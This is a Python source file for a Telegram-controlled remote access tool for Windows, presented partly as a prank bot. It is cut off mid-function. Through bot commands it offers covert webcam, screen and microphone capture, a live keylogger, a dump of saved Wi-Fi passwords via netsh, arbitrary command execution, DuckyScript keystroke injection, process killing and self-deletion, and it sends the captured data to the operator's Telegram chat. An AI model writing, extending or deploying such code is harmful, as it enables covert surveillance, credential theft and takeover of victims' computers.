#TELEGRAM
import requests
from telepot import Bot, glance
from telepot.loop import MessageLoop
from telepot.exception import TelegramError
from urllib3.exceptions import MaxRetryError
from telepot.namedtuple import InlineKeyboardButton, InlineKeyboardMarkup

#IMAGES
import numpy as np
from PIL import Image
from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                 setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                 destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap,
                 destroyWindow, destroyAllWindows, copyMakeBorder, BORDER_CONSTANT)

#MERGE AUDIO&VIDEO
from moviepy.editor import AudioFileClip, VideoFileClip

#AUDIO
import soundfile as sf
import sounddevice as sd
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

try:
    from winsound import PlaySound, SND_FILENAME, SND_ASYNC
except ImportError:
    PlaySound = lambda *args:args
    SND_FILENAME = None

#MISC
import sys
import json
import ctypes
import psutil
import socket
import traceback
import pyautogui as pg
import subprocess as sp
from shutil import copy2
from re import findall, M
from xml.dom import minidom
from time import time, sleep
from threading import Thread
from datetime import datetime
from tempfile import gettempdir
from typing import Any, Callable
from io import BytesIO, StringIO
from random import choice, randint
from webbrowser import open as browseropen
from string import ascii_letters, printable
from subprocess import CREATE_NO_WINDOW, Popen
from os.path import join, abspath, isfile, exists, dirname, realpath
from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod 
from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN


def resource_path(relative_path: str) -> str:
    if getattr(sys, 'frozen', False):
        base_path = dirname(sys.executable)
    else:
        base_path = dirname(__file__)
    return join(base_path, relative_path)

logging = False
iswindows = name == "nt"
islinux = not iswindows
cwd_folder = getcwd()
HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
BURN_DIRECTORY = gettempdir()
MOUSE_JMP = 50

try:
    vfx = resource_path("vfx")
    sfx = resource_path("sfx")
    prototxt_filename = resource_path(join("model","1.prototxt"))
    caffemodel_filename = resource_path(join("model","2.caffemodel"))
except Exception as e:
    print(e)
    exit()

def randomname(lenght: int=10) -> str:
    return "".join([ choice(ascii_letters) for _ in range(lenght)])

while isfile(BURN_DIRECTORY):
    BURN_DIRECTORY = BURN_DIRECTORY+randomname(3)

if isfile(prototxt_filename) and isfile(caffemodel_filename):
    with open(prototxt_filename, 'rb') as f:
        prototxt_data = f.read()
    with open(caffemodel_filename, 'rb') as f:
        caffemodel_data = f.read()
    prototxt_buffer = np.frombuffer(prototxt_data, dtype=np.uint8)
    caffemodel_buffer = np.frombuffer(caffemodel_data, dtype=np.uint8)
    FACERECOGNITION = True
    net = dnn.readNetFromCaffe(prototxt_buffer.tobytes(), caffemodel_buffer.tobytes())
else:
    FACERECOGNITION = False


DUCKYHELP = """DELAY [time] – Adds a delay in milliseconds (e.g., DELAY 1000 waits 1 second).
REM [comment] – Adds a comment (e.g., REM This is a comment).
STRING [text] – Types a string of characters (e.g., STRING Hello World).
ENTER – Presses the Enter key.
SPACE – Presses the Spacebar.
TAB – Presses the Tab key.
ESC – Presses the Escape key.
CTRL – Presses the Control key.
SHIFT – Presses the Shift key.
ALT – Presses the Alt key.
GUI – Presses the Windows key (or the "Command" key on macOS).
WINDOWS – Same as GUI.
APP – Presses the "Application" key (context menu key).
DOWNARROW, UPARROW, LEFTARROW, RIGHTARROW – Presses arrow keys.
CAPSLOCK – Toggles Caps Lock.
NUMLOCK – Toggles Num Lock.
DELETE – Presses the Delete key.
HOME – Presses the Home key.
END – Presses the End key.
PAGEUP – Presses Page Up.
PAGEDOWN – Presses Page Down."""

HELP = """🛑 System & Shutdown
shutdown - Shut down the PC.
fakeshutdown - Fake system shutdown.
altf4 - Simulate Alt + F4.
clear - Removes all cv2 windows, closes webcam and removes temporary files.
selfdestruction - Removes the program from the machine permanently.

🌐 Network & Remote Access
wifiinfo - Dump saved Wi-Fi SSIDs and passwords.
ipinfo - Get public IP and geolocation.

📸 Camera & Screen
selfie - Take a webcam selfie.
screenshot - Capture screen.
fullclip - Record screen + webcam.
webcamclip - Record webcam.
screenclip - Record screen.
recordjum - Records 20 second clip of jumpscare.
waitforface - Send a webcam photo when face is detected till timeout.
displaymode - Send a display set menu.

🔊 Audio & Volume
breath - Play breathing sound.
pss - Play "psst" sound.
microphone - Record mic audio.
mutevolume - Set computer's volume to 0.
fullvolume - Set computer's volume to 100.
setvolume - Set computer's volume level.
getvolume - Gets the computer's volume level.
tralalerotralala - Plays italian brainrot.
mixermenu - Sends a mixer menu.

😈 Pranks & Visuals
jumpscare - Show random jumpscare.
jumpscarenoaudio - Jumpscare no audio.
invertedscreen - Shows inverted colors screenshot.
distortedscreen - Shows distorted screenshot.
messagebox - Show a custom message box.
messagespam - Spam message boxes.
camerawallpaper - Sets webcam's frames as wallpaper.
setvideowallpaper - Sets a video as wallpaper.

💻 System Control
execute - Run system command.
processkiller - Shows a table of processes that you can kill.
terminateprocess - Kills a process by name.

🎮 Input / Device Control
randomkeyboard - Sets all user's input to random characters.
capslock - Activates capslock.
mousecontroller - Sends a mouse controlling menu.
mouselock - Locks the mouse in position.

📋 Messaging
bsend - Send custom text.
id - Get Owner Chat ID.
quickmenu - Opens a quick menu.

🔒 Can't Open List
cantopenadd - Adds process to cantopenlist.
cantopenremove - Removes process from cantopenlist.
cantopenmenu - Displays processes on cantopenlist, clicking them will remove them.

🧠 Keylogger
keylogger - Records pressed keys on keyboard.
livekeylogger - Sends live updates about what's being typed on the keyboard.

🦑 Misc
plankton - Plankton.
planktonnoaudio - Plankton no audio.
johnpork - John Pork.
johnporknoaudio - John Prok no audio.
gabinetti - Gabinetti nella villa.
duckyscript - Execute duckyscript string.
duckyhelp - Show Duckyscript tutorial.
browser - Open URL in browser.

📎 File Input Commands
*sending a photo* - Displays the photo on the screen as a pop-up.
*sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
*sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).
*sending an audio/voice* - Will play the audio/voice in the background.
*sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)

📚 Multi-Command
You can run multiple commands at the same time by sending them in the same message but separated by a comma.
For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
jumpscare while recording screen and webcam
"""

def now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def checkconn() -> bool:
    try:
        s = socket.socket()
        s.connect(("www.google.com",80))
        return True
    except Exception as e:
        return False

#AUDIO CONVERSION
def wav_to_ogg(filename: str, rmold: bool=False) -> str:
    data, samplerate = sf.read(filename)
    new_filepath = filename.replace(".wav", ".ogg")
    sf.write(new_filepath, data, samplerate, format="OGG", subtype="OPUS")
    if rmold:
        remove(filename)
    return new_filepath

def ogg_to_wav(filename: str, rmold: bool=False) -> str:
    data, sr = sf.read(filename) 
    new_filepath = filename.replace(".ogg", ".wav")
    sf.write(new_filepath, data, sr)
    if rmold:
        remove(filename)
    return new_filepath

#GETTING TOKEN AND CHAT_ID
def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
    with open(filename) as fi:
        var = json.load(fi)
    return var["token"],var["chatid"]
        
#Resizing assets so they all take the same time to load when doing jumpscares(I guess)
def compress_and_resize_image(image_array, target_size=(1920, 1080), quality=30) -> np.array:
    img = Image.fromarray(image_array)
    img_resized = img.resize(target_size, Image.Resampling.LANCZOS)
    buffer = BytesIO()
    img_resized.save(buffer, 'JPEG', quality=quality)
    buffer.seek(0)
    compressed_image = np.array(Image.open(buffer))
    return compressed_image

def show_image_fullscreen(image, timeout=1250) -> None:
    namedWindow("FullScreenImage", WND_PROP_FULLSCREEN)
    setWindowProperty("FullScreenImage", WND_PROP_TOPMOST, 1)
    setWindowProperty("FullScreenImage", WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN)
    imshow("FullScreenImage", image) 
    waitKey(timeout)
    destroyAllWindows()

def invert_image(imagearray:np.array) -> np.array:
    return bitwise_not(imagearray)

def distorted_screen(image, strength=5, frequency=50):
    h, w, _ = image.shape
    map_x, map_y = np.meshgrid(np.arange(w, dtype=np.float32), np.arange(h, dtype=np.float32))

    map_x += np.sin(map_y / frequency) * strength
    map_y += np.cos(map_x / frequency) * strength

    distorted = remap(image, map_x, map_y, interpolation=INTER_LINEAR, borderMode=BORDER_REFLECT)
    return distorted

def detect_face(cap:VideoCapture|None=None) -> tuple[int,Mat]:
    if not FACERECOGNITION:
        return False, None
    rls=True
    if cap:
        rls=False
    else:
        cap = VideoCapture(0)
    ret, frame = cap.read()
    if not ret:
        return 0, None
    if rls:
        cap.release()
    blob = dnn.blobFromImage(frame, 1.0, (300, 300), (104.0, 177.0, 123.0), False, False)
    net.setInput(blob)
    detections = net.forward()
    return sum(1 for i in range(detections.shape[2]) if detections[0, 0, i, 2] > 0.5), frame

def load_images(vfx_folder: str=vfx) -> dict[str:Mat]:
    return { x[:-4]:compress_and_resize_image(imread(join(vfx_folder,x))) for x in listdir(vfx_folder) }

def load_audios(sfx_folder: str=sfx) -> list[str]:
    return { x[:-4]:abspath(join(sfx_folder,x)) for x in listdir(sfx_folder) }

def randompngname(lenght: int=10) -> str:
    return randomname(lenght)+".png"

def get_current_wallpaper():
    SPI_GETDESKWALLPAPER = 0x0073
    MAX_PATH = 260
    buffer = ctypes.create_unicode_buffer(MAX_PATH)
    ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, buffer, 0)
    path = buffer.value
    return path if isfile(path) else None

def backup_wallpaper(backup_path):
    current_wallpaper = get_current_wallpaper()
    if exists(current_wallpaper):
        copy2(current_wallpaper, backup_path)
        return True
    else:
        return False

def change_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 20  
    SPIF_UPDATEINIFILE = 0x01  
    SPIF_SENDWININICHANGE = 0x02  

    try:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abspath(image_path),
                                                   SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
        return True
    except Exception as e:
        return False

def pad_to_16_9(image):
    height, width = image.shape[:2]
    current_ratio = width / height
    target_ratio = 16 / 9
    if abs(current_ratio - target_ratio) < 0.01:
        return image
    if current_ratio > target_ratio:
        new_height = int(width / target_ratio)
        pad = (new_height - height) // 2
        padded = copyMakeBorder(image, pad, new_height - height - pad, 0, 0, BORDER_CONSTANT, value=(0, 0, 0))
    else:
        new_width = int(height * target_ratio)
        pad = (new_width - width) // 2
        padded = copyMakeBorder(image, 0, 0, pad, new_width - width - pad, BORDER_CONSTANT, value=(0, 0, 0))
    return padded

"""
oooooooooo.    .oooooo..o   .oooooo.   ooooooooo.   ooooo ooooooooo.   ooooooooooooo 
`888'   `Y8b  d8P'    `Y8  d8P'  `Y8b  `888   `Y88. `888' `888   `Y88. 8'   888   `8 
 888      888 Y88bo.      888           888   .d88'  888   888   .d88'      888      
 888      888  `"Y8888o.  888           888ooo88P'   888   888ooo88P'       888      
 888      888      `"Y88b 888           888`88b.     888   888              888      
 888     d88' oo     .d8P `88b    ooo   888  `88b.   888   888              888      
o888bood8P'   8""88888P'   `Y8bood8P'  o888o  o888o o888o o888o            o888o     

"""
def toducky(payload, execute=False) -> str:
    print(f"toducky: {payload}")
    duckyScript = [x.strip() for x in payload.split("\n")]
    final = ""
    defaultDelay = 0
    if duckyScript[0][:7] == "DEFAULT":
        defaultDelay = int(duckyScript[0][:13]) / 1000
    previousStatement = ""
    duckyCommands = ["WINDOWS", "GUI", "APP", "MENU", "SHIFT", "ALT", "CONTROL", "CTRL", "DOWNARROW", "DOWN",
                     "LEFTARROW", "LEFT", "RIGHTARROW", "RIGHT", "UPARROW", "UP", "BREAK", "PAUSE", "CAPSLOCK", "DELETE", "END",
                     "ESC", "ESCAPE", "HOME", "INSERT", "NUMLOCK", "PAGEUP", "PAGEDOWN", "PRINTSCREEN", "SCROLLLOCK", "SPACE", 
                     "TAB", "ENTER", " a", " b", " c", " d", " e", " f", " g", " h", " i", " j", " k", " l", " m", " n", " o", " p", " q", " r", " s", " t",
                     " u", " v", " w", " x", " y", " z", " A", " B", " C", " D", " E", " F", " G", " H", " I", " J", " K", " L", " M", " N", " O", " P",
                     " Q", " R", " S", " T", " U", " V", " W", " X", " Y", " Z"]
    pyautoguiCommands = ["win", "win", "optionleft", "optionleft", "shift", "alt", "ctrl", "ctrl", "down", "down",
                         "left", "left", "right", "right", "up", "up", "pause", "pause", "capslock", "delete", "end",
                         "esc", "escape", "home", "insert", "numlock", "pageup", "pagedown", "printscreen", "scrolllock", "space",
                         "tab", "enter", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
                         "u", "v", "w", "x", "y", "z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
                         "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
    for line in duckyScript:
        if line[0:3] == "REM":
            previousStatement = line.replace("REM", "#")
        elif line[0:5] == "DELAY":
            previousStatement = "sleep(" + str(float(line[6:]) / 1000) + ")"
        elif line[0:6] == "STRING":
            previousStatement = "pg.typewrite(\"" + line[7:] + "\", interval=0.02)"
        elif line[0:6] == "REPEAT":
            for i in range(int(line[7:]) - 1):
                final += previousStatement
                final += "\n"
        else:
            previousStatement = "pg.hotkey("
            for j in range(len(pyautoguiCommands)):
                if line.find(duckyCommands[j]) != -1:
                    previousStatement = previousStatement + "\'" + pyautoguiCommands[j] + "\',"
            previousStatement = previousStatement[:-1] + ")"
        if defaultDelay != 0:
            previousStatement = "sleep(" + str(defaultDelay) + ")"
        final += previousStatement
        final += "\n"

    final = final.replace("pg.hotkey)\n", "")
    if execute:
        exec(final)
    return final

class WifiDumper:
    def __init__(self) -> None:
        pass

    def extract_all(self) -> dict[str:str]:
        sp.run("netsh wlan export profile key=clear", stdout=sp.PIPE, stderr=sp.PIPE)
        xmls = []
        wifis = {} 
        for file in listdir():
            if file.endswith(".xml") and file.startswith("Wi-Fi"):
                xmls.append(file)

        for xml in xmls:
            file = minidom.parse(xml)
            psw = file.getElementsByTagName("keyMaterial")[0].firstChild.data
            name = file.getElementsByTagName("name")[0].firstChild.data

            wifis.update({name:psw})

        for file in xmls:
            remove(file)
        return wifis

    def __str__(self) -> str:
        return "\n".join([f"🛜 *{k}*\n🔑 `{v}`\n" for k,v in self.extract_all().items()])

class ButtonsMenu:
    def __init__(self, chat_id: int, bot: Bot, buttons: dict[str, Callable], label: str = "Choose an action", autosend: bool=True, next_btn: bool=False, page_limit: int = 8, page: int=0, next_btn_lab: str = "next_page", prev_btn_lab: str = "previous_page", close_btn_lab="close_page", keyboard_rows=2) -> None:
        self.bot = bot
        self.label = label
        self.chat_id = chat_id
        self.buttons = buttons
        self.process_killer_page_limit = page_limit
        self.process_killer_page = page 
        self.keyboard_rows = keyboard_rows
        self.next_btn = next_btn
        self.next_btn_lab = next_btn_lab
        self.prev_btn_lab = prev_btn_lab
        self.close_btn_lab = close_btn_lab
        self.sent = False

        self.keyboard = self.create_keyboard()
        if autosend:
            self.send_keyboard()

    def create_keyboard(self) -> Any:
        start_index = self.process_killer_page * self.process_killer_page_limit
        button_list = [InlineKeyboardButton(text=k, callback_data=self.buttons[k]) for k in list(self.buttons.keys())[start_index:start_index + self.process_killer_page_limit]]

        if self.next_btn:
            if self.process_killer_page > 0:
                button_list.append(InlineKeyboardButton(text="⬅️ Previous", callback_data=self.prev_btn_lab))
            if (self.process_killer_page + 1) * self.process_killer_page_limit < len(self.buttons):
                button_list.append(InlineKeyboardButton(text="Close ❌", callback_data=self.close_btn_lab)) 
                button_list.append(InlineKeyboardButton(text="Next ➡️", callback_data=self.next_btn_lab)) 
        else:
            button_list.append(InlineKeyboardButton(text="Close ❌", callback_data=self.close_btn_lab)) 

        keyboard_rows = [button_list[i:i+self.keyboard_rows] for i in range(0, len(button_list), self.keyboard_rows)]
        return InlineKeyboardMarkup(inline_keyboard=keyboard_rows)

    def send_keyboard(self) -> int:
        self.sent = True
        self.message_id = self.bot.sendMessage(self.chat_id, self.label, reply_markup=self.keyboard)["message_id"]
        return self.message_id
    
    def edit_keyboard(self, buttons: dict) -> int:
        self.buttons = buttons
        self.keyboard = self.create_keyboard()
        self.message_id = self.bot.editMessageReplyMarkup((self.chat_id, self.message_id), reply_markup=self.keyboard)["message_id"]
        return self.message_id

    def delete(self):
        if self.sent:
            self.bot.deleteMessage((self.chat_id, self.message_id))


class EditableMessage:
    def __init__(self, bot: Bot, chat_id, content: str, autosend: bool=True, bold: bool=False) -> None:
        self.bot = bot
        self.bold = bold
        self.chat_id = chat_id
        self.content = content
        self.sent = False
        if autosend:
            self.send()
    
    def send(self) -> int|None:
        if self.bold:
            self.content = f"<b>{self.content}</b>"
        try:
            self.message_id = self.bot.sendMessage(self.chat_id, self.content, parse_mode="HTML" if self.bold else None)["message_id"]
            self.sent = True
            return self.message_id
        except Exception as e:
            ...
    
    def edit(self, new_content: str) -> bool:
        if self.bold:
            new_content = f"<b>{new_content}</b>"
        try:
            self.bot.editMessageText((self.chat_id, self.message_id), new_content, parse_mode="HTML" if self.bold else None)
            return True
        except TelegramError as e:
            return False
    
    def delete(self) -> None:
        if self.sent:
            self.bot.deleteMessage((self.chat_id, self.message_id))
    
    def delete_and_send(self, message: str) -> None:
        self.delete()
        self.bot.sendMessage(self.chat_id, message)

class AsciiAnimation(EditableMessage):
    def __init__(self, bot, chat_id, frames, autosend=True, bold=False):
        super().__init__(bot, chat_id, content=frames[0], autosend=autosend, bold=bold)
        self.frames = frames
    
    def play(self, repeat: int):
        for i in range(repeat):
            for frame in self.frames:
                self.edit(frame)
                sleep(0.5)

all_spinners = {
    "slash": ["|", "/", "-", "\\"],
    "double_bar": ["-", "=", "~", "-"],
    "dot_wave": [".  ", ".. ", "...", " ..", "  .", "   "],
    "line_bounce": ["_", "‾"],
    "dots_3": ["⠁", "⠂", "⠄", "⠂"],
    "quarter": ["◴", "◷", "◶", "◵"],
    "half_moon": ["◐", "◓", "◑", "◒"],
    "block_corner": ["▖", "▘", "▝", "▗"],
    "clock": ["🕛", "🕐", "🕑", "🕒", "🕓", "🕔", "🕕", "🕖", "🕗", "🕘", "🕙", "🕚"],
    "arrow": ["←", "↖", "↑", "↗", "→", "↘", "↓", "↙"],
    "double_arrow": ["⇐", "⇑", "⇒", "⇓"],
    "braille": ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"],
    "colored_blocks": ["🟥⬜⬜", "🟩🟥⬜", "⬜🟩🟥", "⬜⬜🟩", "⬜⬜⬜"],
    "bouncing_bar": ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃", "▂", "▁"],
    "pixel": ["⡀", "⠄", "⠂", "⠁", "⠈", "⠐", "⠠", "⢀"],
    "circle_dots": ["◜", "◠", "◝", "◞", "◡", "◟"],
    "gear": ["⚙️", "⚙️", "⚙️", "⚙️"],  # static gear, or rotate manually
    "signal": ["▂", "▄", "▆", "▇", "█", "▇", "▆", "▄"]
}

class LoadingBar:
    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None, spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶", spinner_frames=all_spinners["braille"], spinner_pos: str="left", bar_lenght: int=10):
        self.bot = bot
        self.tot = int(total)
        self.label = label
        self.chat_id = chat_id
        self.showperc = showperc
        self.autodelete = autodelete


        self.spinner = spinner_frames
        self.spinner_index = 0
        self.spinner_enabled = spinner_enabled
        self.spinner_delay = 0.2
        self.spinner_pos = spinner_pos

        self.full_char = full_char
        self.empty_char = empty_char

        self.progress = 0
        self.done = False
        self.deleted = False
        self.bar_lenght = bar_lenght

        self.bar = self.get_bar()

        if autosend:
            self.setup()

    def get_bar(self):
        self.perc_progress = round((self.progress / self.tot) * 100, 1)
        self.int_perc_progress = int(self.perc_progress)
        bar = self.full_char * (self.int_perc_progress//self.bar_lenght) + (self.empty_char * ((self.bar_lenght - (self.int_perc_progress//self.bar_lenght))))
        bar = f"{bar}" + (f"{self.perc_progress}%" if self.showperc else "")
        if self.label:
            bar = f"{self.label}\n{bar}"
        if self.spinner_enabled:
            bar = f"{self.spinner[self.spinner_index]}{bar}" if self.spinner_pos == "left" else f"{bar}{self.spinner[self.spinner_index]}"
        return bar

    def spinner_cycle(self):
        while self.perc_progress < 100:
            new_bar = self.get_bar()
            self.ETDMessage.edit(new_bar)
            if self.spinner_index == len(self.spinner)-1:
                self.spinner_index = 0
            else:
                self.spinner_index += 1
            sleep(self.spinner_delay)

    def prep_animation(self, repeat: int = 2, progress: int = 25) -> None:
        for i in range(repeat):
            for i in range(0, 101, progress):
                self.set_progress(i)
                self.update()
                sleep(0.05)
            for i in range(100, 0, -progress):
                self.set_progress(i)
                self.update()
                sleep(0.05)

            for i in range(0, 101, progress):
                self.set_progress(i)
                self.update()
            sleep(0.05)
        self.set100()
        self.delete()

    def setup(self):
        bar = self.get_bar()
        self.ETDMessage = EditableMessage(self.bot, self.chat_id, bar)
        if self.spinner_enabled:
            t = Thread(target=self.spinner_cycle)
            t.start()

    def set_progress(self, progress: int) -> None:
        self.progress = progress

    def update(self, new_progress: None|int=None):
        if new_progress:
            self.set_progress(new_progress)
        if self.done:
            return
        previous_bar = self.bar
        bar = self.get_bar()
        if bar!=previous_bar:
            self.ETDMessage.edit(bar)
            return
        if self.int_perc_progress >= 100 and self.autodelete:
            self.ETDMessage.delete()
            self.done = True
    
    def fill_and_delete(self) -> None:
        self.set100()
        self.delete()
    
    def delete(self):
        if not self.deleted:
            self.deleted = True
            self.ETDMessage.delete()
    
    def set100(self):
        if self.done:
            return
        self.progress = self.tot
        self.update()



"""
ooo        ooooo             ooo        ooooo  o8o
`88.       .888'             `88.       .888'  `"'
 888b     d'888  oooo    ooo  888b     d'888  oooo  oooo    ooo  .ooooo.  oooo d8b 
 8 Y88. .P  888   `88.  .8'   8 Y88. .P  888  `888   `88b..8P'  d88' `88b `888""8P 
 8  `888'   888    `88..8'    8  `888'   888   888     Y888'    888ooo888  888     
 8    Y     888     `888'     8    Y     888   888   .o8"'88b   888    .o  888     
o8o        o888o     .8'     o8o        o888o o888o o88'   888o `Y8bod8P' d888b    
                 .o..P'
                 `Y8P'
"""
class CustomMixer:
    def __init__(self) -> None:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        self.volume = cast(interface, POINTER(IAudioEndpointVolume))
    
    def setVolumePercentage(self, percentage: int|float) -> None:
        percentage = float(percentage)
        if percentage in range(0, 101):
            self.volume.SetMasterVolumeLevelScalar(percentage/100, None) 
    
    def getVolumePercentage(self) -> int:
        current_volume = round(self.volume.GetMasterVolumeLevelScalar()*100)
        return current_volume

    def mute(self) -> None:
        self.setVolumePercentage(0)

    def full(self) -> None:
        self.setVolumePercentage(100)


"""
ooooooooo.     .oooooo.   ooooooooo.
`888   `Y88.  d8P'  `Y8b  `888   `Y88.
 888   .d88' 888           888   .d88'  .ooooo.  oo.ooooo.
 888ooo88P'  888           888ooo88P'  d88' `88b  888' `88b
 888`88b.    888           888         888ooo888  888   888
 888  `88b.  `88b    ooo   888         888    .o  888   888
o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  888
                                                 o888o
"""
class PeppinoTelegram:
        def __init__(self, token: str, owner_id: int, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]]) -> None:
            self.token = token
            self.owner_id = owner_id
            self.loading_bar_set = loading_bar_set
            self.loading_bar_spinner = loading_bar_spinner
    
            self.help = HELP
            self.process_killer_page = 0
            self.owner_name = ""
            self.cap = capture
            self.bot = Bot(token) 
            self.cantopenlist = []
            self.duckyhelp = DUCKYHELP
            self.explorer_path = getcwd()
            self.audio_mixer = mixer
            self.process_explorer_menu = None
            self.explorer_message = None
            self.mixer_menu_keyboard = None
            self.mouse_controller_menu = None
            self.display_mode_keyboard  = None
            self.wifidumper = WifiDumper()
            #converts text to functions
            self.function_table: dict[str:Callable] = {
                "pss":self.pss,
                "psst":self.pss,
                "bsend":self.bsend,
                "stop":self.stop,
                "altf4":self.altf4,
                "breath":self.breath,
                "browser":browseropen,
                "execute":self.execute,
                "selfie":self.selfie,
                "plankton":self.plankton,
                "johnpork":self.johnpork,
                "shutdown":self.shutdown,
                "quickmenu":self.quickmenu,
                "gabinetti":self.gabinetti,
                "jumpscare":self.jumpscare,
                "keylogger":self.keylogger,
                "screenshot":self.screenshot,
                "messagebox":self.message_box,
                "waitforface":self.waitforface,
                "webcamclip":self.record_webcam,
                "screenclip":self.record_screen,
                "messagespam":self.spam_windows,
                "checkforface":self.checkforface,
                "fakeshutdown":self.fake_shutdown,
                "processkiller":self.process_killer,
                "livekeylogger":self.live_keylogger,
                "microphone":self.send_record_audio,
                "help":lambda: self.bsend(self.help),
                "invertedscreen":self.inverted_screen,
                "johnporknoaudio":self.johnporknoaudio,
                "planktonnoaudio":self.planktonnoaudio,
                "distortedscreen":self.distorted_screen,
                "displaymode":self.display_mode,
                "jumpscarenoaudio":self.jumpscarenoaudio,
                "ipinfo":self.ipinfo,
                "mouselock":self.mouselock,
                #"keyboardlock":self.keyboardlock,
                "fullclip":self.record_webcam_and_screen,
                "selfdestruction":self.selfdestruction,
                "duckyhelp":lambda: self.bsend(self.duckyhelp),
                "duckyscript": lambda *args: toducky(" ".join(args), execute=True),
                "capslock": lambda: toducky("CAPSLOCK", execute=True),
                "randomkeyboard":self.randomkeyboard,
                "terminateprocess":self.terminate_process_by_name,
                "setvideowallpaper":self.setvideowallpaper,
                "id":lambda:self.bsend(f"🆔 CHAT_ID: {self.owner_id}"),
                "recordjum":self.record_jumpscare_reaction,
                "mutevolume":lambda:self.audio_mixer.mute(),
                "setvolume":self.audio_mixer.setVolumePercentage,
                "fullvolume":lambda:self.audio_mixer.full(),
                "wifiinfo":self.wifiinfo,
                "mixermenu":self.mixer_menu,
                "camerawallpaper":self.setCameraAsWallpaper,
                "mousecontroller":self.mousecontroller,
                "cantopenmenu":self.cantopenmenu,
                "cantopenadd":self.cantopen,
                "cantopenremove":self.removefromcantopen,
                "clear":self.clear,
                "mouser":self.mouser,
                "mousel":self.mousel,
                "mouseu":self.mouseu,
                "moused":self.moused,
                "leftclick":self.leftclick,
                "rightclick":self.rightclick,
                "nothing":lambda:...,
                "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
                "tralalerotralala":lambda:self.__play_loaded_sound("tralarero-tralala", volume=8)
            }
            self.no_background_functions = [self.message_box, self.spam_windows]

        def __play_loaded_sound(self, audio: str, volume=None) -> None:
            old = self.audio_mixer.getVolumePercentage()
            if volume:
                self.set_volume(volume)
            self.__playsound(self.audios[audio])
            sleep(5)
            if volume:
                self.set_volume(old)

        def __playsound(self, audio: str) -> None:
            PlaySound(audio, SND_FILENAME | SND_ASYNC)

        def __send_image(self, image_name: str, caption=None) -> bool:
            try:
                with open(image_name, "rb") as image:
                    msg = self.bot.sendPhoto(self.owner_id, image, caption=caption)["message_id"]
                return msg
            except Exception as e:
                return self.bsend(f"Error while sending an image\n{e}")

        def altf4(self) -> None:
            press_key('alt')
            press_key('f4')
            release_key('f4')
            release_key('alt')

        def breath(self) -> None:
            self.__play_loaded_sound("breath")

        def bsend(self, text: str, retries=0, parse_mode:str|None=None) -> int|None:
            if retries>3:
                return
            try:
                if checkconn():
                    return self.bot.sendMessage(self.owner_id, text, parse_mode=parse_mode)["message_id"]
                raise ConnectionError
            except Exception as e:
                return self.bsend(text, retries+1)

        def cantopen(self, process: str) -> None:
            self.cantopenlist.append(process)
            self.bsend(f"Added {process} to cantopenlist.")

        def cantopenkiller(self) -> None:
            while True:
                for process in self.cantopenlist:
                    if self.check_if_proc_running(process):
                        self.terminate_process_by_name(process)
                sleep(1)

        def cantopenmenu(self) -> None:
            if self.cantopenlist:
                dict_menu = { proc:f"/cantopenremove {proc}" for proc in self.cantopenlist}
                menu = self.new_menu(dict_menu)
            else:
                self.bsend("cantopenlist is empty.")

        def check_if_proc_running(self, processname) -> bool:
            return processname.lower().strip() in [x.name().lower().strip() for  x in psutil.process_iter()]

        def checkforface(self) -> None:
            res, frame = detect_face(self.cap)
            if res:
                self.bsend("Face found")
            else:
                self.bsend("Face not found")

        def clear(self) -> None:
            self.closecap()
            map(remove, listdir(BURN_DIRECTORY))
            destroyAllWindows()
            self.audio_mixer.mute()
            #self.restore_wallpaper()
            self.cantopenlist.clear()

        def closecap(self) -> None:
            if self.cap.isOpened():
                self.cap.release()

        def distorted_screen(self) -> None:
            self.modded_screenshot(lambda x: distorted_screen(x, randint(20, 40), randint(50, 55)))

        def display_mode(self) -> None:
            buttons = {
                "Only PC"      : "/execute DisplaySwitch.exe /internal",
                "Only External": "/execute DisplaySwitch.exe /external",
                "Clone"        : "/execute DisplaySwitch.exe /clone",
                "Extend"       : "/execute DisplaySwitch.exe /extend",
            }
            self.display_mode_keyboard = self.new_menu(buttons, close_btn_lab="DISPLAYSET_close")

        def execute(self, *command, return_output: bool=False) -> None:
            command = " ".join(command)
            s = sp.run(command, stdout=sp.PIPE, stderr=sp.PIPE, encoding="utf-8")
            if s.returncode:
                output = s.stderr
            else:
                output = s.stdout
    
            if output:
                if return_output:
                    return output
